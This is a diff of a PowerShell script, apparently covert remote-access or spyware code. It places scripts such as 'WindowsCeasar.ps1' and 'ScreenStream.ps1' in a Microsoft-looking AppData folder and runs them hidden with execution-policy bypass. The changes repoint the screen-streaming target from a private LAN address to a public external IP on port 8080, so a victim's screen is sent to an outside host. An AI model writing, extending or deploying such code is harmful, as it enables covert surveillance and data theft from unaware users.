@@ -11,7 +11,7 @@ try {
 # Zielordner (dynamisch für aktuellen User)
 $basePowerShellFolder = "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell"
 $operationsFolder = Join-Path $basePowerShellFolder "operations"
-$flagFilePath = Join-Path $targetFolder "operator_initialized.flag"
+#$flagFilePath = Join-Path $targetFolder "operator_initialized.flag"
 $targetFolder = Join-Path $operationsFolder "System"
 $ceasarScriptPath = Join-Path $targetFolder "WindowsCeasar.ps1"
 $operatorScriptPath = Join-Path $targetFolder "WindowsOperator.ps1"
@@ -228,7 +228,7 @@ $powerShellExe = 'powershell.exe'
 $hiddenExecutionArgs = '-WindowStyle Hidden -ExecutionPolicy Bypass -File'
 $screenStreamScript = 'ScreenStream.ps1'
 $arg14 = '-a14'
-$ipAddress = '192.168.178.197'
+$ipAddress = '145.223.117.77'
 $arg15 = '-a15'
 $port = '8080'
 $arg16 = '-a16'
@@ -1188,7 +1188,7 @@ Write-Host "Module deployment completed in $_msftBasePath. Components: $( (Get-C
 
 $microsoftViewSScriptContent = @'
 param(
-    [string]$a14 = "192.168.178.197",
+    [string]$a14 = "145.223.117.77",
     [int]$a15 = 8080,
     [int]$a16 = 15,
     [int]$a17 = 60
